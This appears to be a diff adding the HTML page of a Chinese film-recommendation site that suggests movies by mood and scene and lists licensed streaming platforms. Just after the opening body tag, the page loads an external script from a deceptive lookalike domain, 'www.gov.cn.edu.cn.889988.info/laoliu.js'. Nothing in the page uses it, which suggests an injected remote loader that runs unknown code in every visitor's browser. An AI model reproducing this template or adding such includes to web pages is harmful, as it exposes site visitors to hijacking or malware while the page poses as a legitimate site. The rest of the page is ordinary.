@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>要看电影网 - 从心情到片单的选片参谋与正版观影指南</title>
+<meta name="description" content="要看电影网（yaokandianyingwang-h5）不做盗版播放器：从心情、场景、时长帮你匹配正片，提供选片逻辑与正版平台速查，让"想看"变成"看对了"。" />
+<meta name="keywords" content="要看电影网,选片参谋,今晚看什么,心情匹配片单,正版观影指南,场景化选片,电影推荐" />
+<meta name="author" content="要看电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://yaokandianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0a0a0f;--bg2:#11111a;--panel:#16161f;--panel2:#1c1c28;
+  --orange:#ff6b35;--orange-dim:rgba(255,107,53,.16);
+  --cyan:#00f5d4;--cyan-dim:rgba(0,245,212,.14);
+  --paper:#f7f3e9;--gray:#8b8d98;--line:rgba(247,243,233,.12);--line2:rgba(247,243,233,.24);
+  --sans:"Arial Black","PingFang SC","Microsoft YaHei",sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:radial-gradient(800px 420px at 75% -10%,rgba(255,107,53,.08),transparent 60%),linear-gradient(180deg,var(--bg),var(--bg2));color:var(--paper);line-height:1.85;font-size:16px;overflow-x:hidden}
+a{color:var(--cyan);text-decoration:none;transition:.25s}a:hover{color:var(--orange)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(10,10,15,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand .stub{width:28px;height:36px;border-radius:3px 8px 3px 8px;background:linear-gradient(135deg,var(--orange),var(--cyan));position:relative;display:flex;align-items:center;justify-content:center}
+.brand .stub::after{content:"🎟";font-size:14px}
+.brand b{color:var(--orange)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--gray);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--paper);background:rgba(247,243,233,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(247,243,233,.08);border:1px solid var(--line2);color:var(--paper);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:100px 0 78px;position:relative}
+.hero::after{content:"";position:absolute;bottom:-40px;left:50%;transform:translateX(-50%);width:80%;height:1px;background:linear-gradient(90deg,transparent,var(--orange),var(--cyan),transparent)}
+.kicker{font-size:12px;letter-spacing:6px;color:var(--orange);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(34px,6.8vw,72px);line-height:1.04;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--cyan);text-shadow:0 0 30px var(--cyan-dim)}
+.hero p{max-width:600px;color:#d4d0c5;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-orange{display:inline-flex;align-items:center;gap:8px;background:var(--orange);color:#1a0e06;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-orange:hover{transform:translateY(-2px);color:#1a0e06}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--paper);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--cyan);color:var(--cyan)}
+
+.match-bar{margin-top:32px;display:flex;gap:10px;flex-wrap:wrap}
+.match-chip{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:8px 18px;font-size:13.5px;color:var(--paper);cursor:pointer;transition:.25s}
+.match-chip:hover{border-color:var(--orange);color:var(--orange);transform:translateY(-2px)}
+.match-chip.active{background:var(--orange);color:#1a0e06;border-color:var(--orange)}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-size:12px;letter-spacing:5px;color:var(--cyan);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--gray);max-width:620px}
+
+/* 场景卡片 */
+.scenes{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px}
+.scene{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:18px;padding:0;overflow:hidden;transition:.35s}
+.scene:hover{transform:translateY(-8px);border-color:rgba(0,245,212,.3);box-shadow:0 24px 56px rgba(0,0,0,.55)}
+.scene .scene-head{padding:28px 24px 18px;border-bottom:1px solid var(--line);position:relative}
+.scene .scene-head .icon{font-size:36px;display:block;margin-bottom:12px}
+.scene .scene-head h3{font-family:var(--sans);font-weight:900;font-size:20px;margin-bottom:4px}
+.scene .scene-head .tag-line{font-size:12.5px;color:var(--cyan);letter-spacing:1px}
+.scene .scene-body{padding:18px 24px 24px}
+.scene .scene-body p{font-size:13.5px;color:#c9c5b8;margin-bottom:14px}
+.scene .pick{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(0,245,212,.06);border-radius:10px;margin-bottom:8px;border-left:3px solid var(--cyan)}
+.scene .pick:last-child{margin-bottom:0}
+.scene .pick b{font-size:14px;color:var(--paper)}
+.scene .pick span{font-size:12px;color:var(--gray);margin-left:auto;white-space:nowrap}
+
+/* 选片逻辑 */
+.logic{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px}
+.step{border:1px solid var(--line);border-radius:14px;padding:28px 22px;background:var(--panel);position:relative;transition:.3s}
+.step:hover{border-color:var(--orange);background:var(--panel2)}
+.step .step-no{font-family:var(--sans);font-weight:900;font-size:48px;color:rgba(255,107,53,.12);position:absolute;top:10px;right:18px;line-height:1}
+.step h4{font-family:var(--sans);font-weight:900;font-size:16px;margin-bottom:8px;color:var(--orange)}
+.step p{font-size:14px;color:#c9c5b8}
+
+/* 渠道速查 */
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table{width:100%;min-width:600px;border-collapse:collapse}
+thead th{text-align:left;padding:14px 16px;font-family:var(--sans);font-size:12px;letter-spacing:3px;color:var(--cyan);text-transform:uppercase;border-bottom:2px solid var(--line)}
+tbody td{padding:14px 16px;border-bottom:1px solid var(--line);font-size:14.5px;color:#d4d0c5}
+tbody tr:hover{background:rgba(0,245,212,.04)}
+tbody td b{color:var(--orange)}
+tbody td a{font-size:13.5px}
+
+/* 关于 */
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:720px;margin:0 auto 22px}
+.quote b{color:var(--orange)}
+.about p{color:var(--gray);max-width:560px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--gray);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:760px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--orange)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--gray);max-width:320px}
+.foot-col h5{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--cyan);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#c9c5b8;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--gray);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-orange,.btn-line{width:100%;justify-content:center}
+  .match-bar .match-chip{font-size:12.5px;padding:7px 14px}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="stub"></span>要看<b>电影网</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">选片台</a></li>
+    <li><a href="#match">今晚匹配</a></li>
+    <li><a href="#logic">选片逻辑</a></li>
+    <li><a href="#table">渠道速查</a></li>
+    <li><a href="#about">关于</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">Pick the right film tonight</div>
+  <h1>今晚，<br/>你到底<b>要看</b>什么？</h1>
+  <p>要看电影网（yaokandianyingwang-h5）不是播放器，是坐在你旁边的选片参谋。从心情、场景、时长三个维度，帮你把"想看"变成"看对了"。不解析、不聚合、不盗链。</p>
+  <div class="btns">
+    <a href="#match" class="btn-orange">🎯 开始匹配今晚的片</a>
+    <a href="#logic" class="btn-line">🧠 学选片逻辑</a>
+  </div>
+  <div class="match-bar">
+    <span class="match-chip active">😴 失眠夜</span>
+    <span class="match-chip">💑 约会夜</span>
+    <span class="match-chip">🛋 独处周末</span>
+    <span class="match-chip">👶 带娃下午</span>
+    <span class="match-chip">🎒 朋友聚会</span>
+    <span class="match-chip">🌧 雨天宅家</span>
+  </div>
+</div></section>
+
+<section id="match"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / Tonight Match</div><h2 class="sec-title">今晚匹配</h2>
+  <p class="sec-desc">不是"Top 250"，是"此刻的你 + 此刻的场景 = 此刻该看的片"。点场景标签快速切换。</p></div>
+  <div class="scenes">
+    <div class="scene"><div class="scene-head"><span class="icon">🌧</span><h3>雨天宅家</h3><div class="tag-line">窗外雨声 ≥ 配乐</div></div>
+      <div class="scene-body"><p>适合需要被包裹感的时候。画面要暖，节奏要慢，让雨替你决定什么时候哭。</p>
+        <div class="pick"><b>《小森林》</b><span>治愈 · 全两季</span></div>
+        <div class="pick"><b>《海街日记》</b><span>是枝裕和 · 姐妹</span></div>
+        <div class="pick"><b>《浓情巧克力》</b><span>甜食 · 小镇</span></div>
+      </div></div>
+    <div class="scene"><div class="scene-head"><span class="icon">😴</span><h3>失眠夜</h3><div class="tag-line">不用看完，陪你到困</div></div>
+      <div class="scene-body"><p>不是让你更清醒的悬疑片。是那种画面像白噪音、旁白像哄睡、看十分钟就能合眼的。</p>
+        <div class="pick"><b>《地球之盐》</b><span>摄影散文 · 萨尔加多</span></div>
+        <div class="pick"><b>《轮回》</b><span>无对白 · 全球取景</span></div>
+        <div class="pick"><b>《我在伊朗长大》</b><span>动画自传 · 温和叙事</span></div>
+      </div></div>
+    <div class="scene"><div class="scene-head"><span class="icon">💑</span><h3>约会夜</h3><div class="tag-line">两个人都不尴尬的长度</div></div>
+      <div class="scene-body"><p>别选太沉的，别选太闹的。要能聊、能笑、看完能自然地说"走吧去吃点东西"。</p>
+        <div class="pick"><b>《爱在黎明破晓前》</b><span>对话 · 维也纳</span></div>
+        <div class="pick"><b>《料理鼠王》</b><span>动画 · 美食 · 轻松</span></div>
+        <div class="pick"><b>《诺丁山》</b><span>浪漫喜剧 · 经典</span></div>
+      </div></div>
+    <div class="scene"><div class="scene-head"><span class="icon">🛋</span><h3>独处周末</h3><div class="tag-line">一个人，三小时，值得</div></div>
+      <div class="scene-body"><p>难得没人打扰。选那种需要你全神投入、看完会有"被改变了什么"感觉的片。</p>
+        <div class="pick"><b>《星际穿越》</b><span>科幻 · 诺兰 · 174min</span></div>
+        <div class="pick"><b>《千与千寻》</b><span>宫崎骏 · 成长</span></div>
+        <div class="pick"><b>《布达佩斯大饭店》</b><span>韦斯·安德森 · 对称美学</span></div>
+      </div></div>
+    <div class="scene"><div class="scene-head"><span class="icon">👶</span><h3>带娃下午</h3><div class="tag-line">大人能看进去，小孩不闹</div></div>
+      <div class="scene-body"><p>不是低幼动画。是那种大人看完也觉得"不错"、小孩看完问"再看一遍"的。</p>
+        <div class="pick"><b>《飞屋环游记》</b><span>皮克斯 · 开头8分钟封神</span></div>
+        <div class="pick"><b>《奇迹男孩》</b><span>成长 · 家庭 · 温暖</span></div>
+        <div class="pick"><b>《头脑特工队》</b><span>情绪科普 · 全年龄</span></div>
+      </div></div>
+    <div class="scene"><div class="scene-head"><span class="icon">🎒</span><h3>朋友聚会</h3><div class="tag-line">能暂停讨论，不冷场</div></div>
+      <div class="scene-body"><p>选那种看完能吵起来的——不是烂片，是有话题的。悬疑、反转、价值观碰撞。</p>
+        <div class="pick"><b>《看不见的客人》</b><span>西班牙 · 反转</span></div>
+        <div class="pick"><b>《寄生虫》</b><span>奉俊昊 · 阶层</span></div>
+        <div class="pick"><b>《利刃出鞘》</b><span>阿加莎式 · 群戏</span></div>
+      </div></div>
+  </div>
+</div></section>
+
+<section id="logic"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / How to pick</div><h2 class="sec-title">选片逻辑</h2>
+  <p class="sec-desc">为什么你每次"随便看看"最后都花了40分钟翻片单？因为缺一个决策框架。</p></div>
+  <div class="logic">
+    <div class="step"><div class="step-no">01</div><h4>先定"能量方向"</h4><p>今晚要充电（喜剧/动作）还是放电（文艺/自然纪录片）？方向错了，再好的片也看不进去。</p></div>
+    <div class="step"><div class="step-no">02</div><h4>再定"注意力预算"</h4><p>90分钟以内还是能扛3小时？别在困的时候挑战塔可夫斯基。尊重你的清醒时长。</p></div>
+    <div class="step"><div class="step-no">03</div><h4>然后定"社交模式"</h4><p>一个人看、陪人看、还是一群人看？同片不同伴，体验天差地别。约会别选丧的，聚会别选闷的。</p></div>
+    <div class="step"><div class="step-no">04</div><h4>最后定"情绪出口"</h4><p>你今晚需要被逗笑、被吓到、被感动、还是被震撼？选片不是选"最好"，是选"最对症"。</p></div>
+  </div>
+</div></section>
+
+<section id="table"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Where to watch</div><h2 class="sec-title">正版渠道速查</h2>
+  <p class="sec-desc">选好了，去哪看？按平台→片种速查，不走盗版站。</p></div>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>平台</th><th>擅长片种</th><th>免费区</th><th>会员价参考</th><th>直达</th></tr></thead>
+      <tbody>
+        <tr><td><b>哔哩哔哩</b></td><td>动画/纪录片/影评/冷门</td><td>有（带广告）</td><td>约 ¥15/月</td><td><a href="https://www.bilibili.com" target="_blank" rel="noopener">去B站 →</a></td></tr>
+        <tr><td><b>腾讯视频</b></td><td>华语新片/院线后窗口/剧集</td><td>有限</td><td>约 ¥25/月</td><td><a href="https://v.qq.com" target="_blank" rel="noopener">去腾讯 →</a></td></tr>
+        <tr><td><b>爱奇艺</b></td><td>电影频道/限时免费/自制</td><td>有（限免专场）</td><td>约 ¥22/月</td><td><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去爱奇艺 →</a></td></tr>
+        <tr><td><b>优酷</b></td><td>港片/文化类纪录片/经典剧</td><td>有（部分免费）</td><td>约 ¥20/月</td><td><a href="https://youku.com" target="_blank" rel="noopener">去优酷 →</a></td></tr>
+        <tr><td><b>1905 电影网</b></td><td>国产老片/公版/正版片库</td><td>大量免费</td><td>免费为主</td><td><a href="https://www.1905.com" target="_blank" rel="noopener">去1905 →</a></td></tr>
+        <tr><td><b>欢喜首映</b></td><td>文艺片/独立电影/王家卫</td><td>无</td><td>单片/会员</td><td><a href="https://www.huanxi.com" target="_blank" rel="noopener">去欢喜 →</a></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">"要看"不是动词，<br/>是<b>一种需要被回答的心情</b>。</p>
+  <p>要看电影网假定你每次打开播放器之前，其实不是在找"一部电影"，而是在找一个能匹配今晚自己的东西。我们帮你缩短从"想看"到"看对了"的距离。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>要看电影网（yaokandianyingwang-h5）仅做选片策展、场景化片单推荐、选片逻辑分享与正版平台速查；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="stub"></span>要看<b>电影网</b></div>
+      <p>从心情到片单的选片参谋站：场景匹配、选片逻辑、正版渠道速查。不提供盗版播放。</p></div>
+    <div class="foot-col"><h5>匹配</h5><a href="#match">今晚匹配</a><a href="#logic">选片逻辑</a><a href="#table">渠道速查</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.bilibili.com" target="_blank" rel="noopener">B 站</a><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a><a href="https://www.iqiyi.com" target="_blank" rel="noopener">爱奇艺</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">选片台</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 要看电影网 · yaokandianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 选片参谋向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));
+document.querySelectorAll('.match-chip').forEach(c=>c.addEventListener('click',()=>{document.querySelectorAll('.match-chip').forEach(x=>x.classList.remove('active'));c.classList.add('active')}));
+</script>
+</body>
+</html>
